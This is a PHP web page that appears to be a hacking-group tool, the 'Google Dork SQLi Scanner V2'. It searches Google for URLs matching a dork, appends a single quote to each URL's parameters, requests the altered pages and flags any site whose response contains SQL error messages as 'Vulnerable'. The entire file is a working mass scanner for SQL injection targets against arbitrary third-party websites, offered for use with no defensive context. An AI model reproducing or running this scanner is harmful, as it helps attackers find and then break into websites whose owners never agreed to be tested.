<html> 
<head> 
<title>Google Dork SQLi Scanner V2 [Fl.cReW]</title> 
<style type="text/css"> 
*{ 
    background:url('../images/bg.gif') #111; 
    font-family: Lucida Console,Tahoma; 
    color:#bbb; 
    font-size:11px; 
    text-align:left; 
} 
input,select,textarea{ 
    border:0; 
    border:1px solid #900; 
    color:#fff; 
    background:#000; 
    margin:0; 
    padding:2px 4px; 
} 
input:hover,textarea:hover,select:hover{ 
    background:#200; 
    border:1px solid #f00; 
} 
option{ 
    background:#000; 
} 
.red{ 
    color:#f00; 
} 
.white{ 
    color:#fff; 
} 
a{ 
    text-decoration:none; 
} 
a:hover{ 
    border-bottom:1px solid #900; 
    border-top:1px solid #900; 
} 
#status{ 
    width:100%; 
    height:auto; 
    padding:4px 0; 
    border-bottom:1px solid #300; 
} 
#result a{ 
    color:#777; 
} 
.sign{ 
    color:#222; 
} 
#box{ 
    margin:10px 0 0 0; 
} 
</style> 

</head> 
<body align="center"> 

<?php 
echo "<h2>Google Dork Scanner V2</h2>"; 
echo "<form action='' method='post'>"; 
echo "<b>Dork</b>: <p><input type='text' name='dork' value='inurl:.php?pID='></p>"; 
echo "<input type='submit' value='Yeahh'>"; 
echo "<hr><br />"; 

if($_POST['dork']) { 

@set_time_limit(0); 
@error_reporting(0); 
@ignore_user_abort(true); 
ini_set('memory_limit', '128M'); 

$google = "http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=REPLACE_DORK&num=100&hl=en&as_qdr=all&start=REPLACE_START&sa=N"; 

$i = 0; 
$a = 0; 
$b = 0; 

while($b <= 900) { 
$a = 0; 
flush(); ob_flush(); 
echo "@ Pages: [ $b ]<br />"; 
echo "@ Dork: [ <b>".$_POST['dork']."</b> ]<br />"; 
echo "@ Google Scanner ! .<br />"; 
flush(); ob_flush(); 

if(preg_match("/did not match any documents/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $val)) { 
echo "See something but not found??<br />"; 
flush(); ob_flush(); 
break; 
} 

preg_match_all("/<h2 class=(.*?)><a href=\"(.*?)\" class=(.*?)>/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $sites); 
echo "Result of injection...<br />"; 
flush(); ob_flush(); 
while(1) { 

if(preg_match("/sql syntax|mysql_|different number of column|syntax error converting|error in your SQL syntax|OLE DB Provider for ODBC Drivers|ODBC SQL Server Driver|Incorrect syntax near|Command error|SQLServer JDBC Driver|The error occurred in|SELECT * FROM|mysqld-4.1.22-community-nt-log|ODBC 3.51 Driver|Microsoft JET Database Engine error|ODBC Microsoft Access Driver/", Connect_Host(str_replace("=", "='", $sites[2][$a])))) { 
echo "<a href='".Clean(str_replace("=", "='", $sites[2][$a]))."' target='_blank' class='effectok'>".str_replace("=", "='", $sites[2][$a])."</a> <== <font color='green'>Yeah..Vulnerable ! </font><br />"; 
} else { 
echo "<a href='".Clean(str_replace("=", "='", $sites[2][$a]))."' target='_blank' class='effectfalse'>".str_replace("=", "='", $sites[2][$a])."</a> <== <font color='red'>Not Vulnerable..sorry! </font><br />"; 
flush(); ob_flush(); 
} 
if($a > count($sites[2])-2) { 
echo "Lets..scan other page.. <br />"; 
break; 
} 
$a = $a+1; 
} 
$b = $b+100; 
} 
} 

function Connect_Host($url) { 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_FOLLOW, 0); 
curl_setopt($ch, CURLOPT_HEADER, 1); 
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
$data = curl_exec($ch); 
if($data) { 
return $data; 
} else { 
return 0; 
} 
} 

function Clean($text) { 
return htmlspecialchars($text, ENT_QUOTES); 
} 

?> 
<!-- Edited By Danzel > 
</body> 
</html> 
<br> flashcrew.webs[at]gmail[dot].com</br><p> 
<center> Powered By fLaShcReW!!!</center>
